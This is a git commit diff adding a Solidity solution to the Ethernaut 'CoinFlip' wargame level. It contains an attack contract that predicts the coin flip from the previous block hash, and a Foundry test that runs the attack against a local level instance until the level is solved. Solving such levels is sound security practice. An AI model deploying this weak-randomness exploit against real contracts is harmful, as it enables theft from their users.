d40042ac618d1248da9a1484d621e97f77484b2c
Matous Pistora <matous.pistora@nftscoring.com>
2022-06-07 23:08:26 +0200

    implement Fallout and CoinFlip levels

---
+++ src/CoinFlip/CoinFlipHack.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipHack {
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    function attack(address _coinflip) public returns (bool) {
+        // Calculate the correct value
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 flip = blockValue.div(FACTOR);
+        bool side = flip == 1 ? true : false;
+
+        // Flip with calculated value
+        ICoinFlip coinflip = ICoinFlip(_coinflip);
+        return coinflip.flip(side);
+    }
+}
---
+++ src/test/CoinFlip.t.sol
@@ -0,0 +1,52 @@
+pragma solidity ^0.8.10;
+
+import "ds-test/test.sol";
+import "../CoinFlip/CoinFlipHack.sol";
+import "../CoinFlip/CoinFlipFactory.sol";
+import "../Ethernaut.sol";
+import "./utils/vm.sol";
+
+contract CoinFlipTest is DSTest {
+    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Ethernaut ethernaut;
+
+    function setUp() public {
+        // Setup instance of the Ethernaut contracts
+        ethernaut = new Ethernaut();
+    }
+
+    function testCoinFlipHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
+        ethernaut.registerLevel(coinFlipFactory);
+        vm.startPrank(tx.origin);
+        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
+        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+
+        CoinFlipHack coinFlipHack = new CoinFlipHack();
+
+        // Move the block from 0 to 5 to prevent underflow errors
+        uint256 starting_block = 5;
+        vm.roll(starting_block);
+
+        for (uint i = 0; i <= 10; i++) {
+            vm.roll(starting_block + i);
+            coinFlipHack.attack(address(ethernautCoinFlip));
+        }
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
